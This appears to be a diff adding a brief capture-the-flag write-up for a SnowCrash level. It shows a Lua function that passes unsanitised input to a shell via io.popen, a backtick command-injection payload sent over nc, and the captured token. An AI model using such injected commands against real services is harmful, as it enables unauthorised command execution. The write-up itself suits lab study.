@@ -1,0 +1,10 @@
+Hashing function executes unsafe user input, pass can be expanded to execute getflag
+
+function hash(pass)
+  prog = io.popen("echo "..pass.." | sha1sum", "r")
+
+level11@SnowCrash:~$ nc localhost 5151
+Password: `getflag > /var/crash/toto`
+Erf nope..
+level11@SnowCrash:~$ cat /var/crash/toto 
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
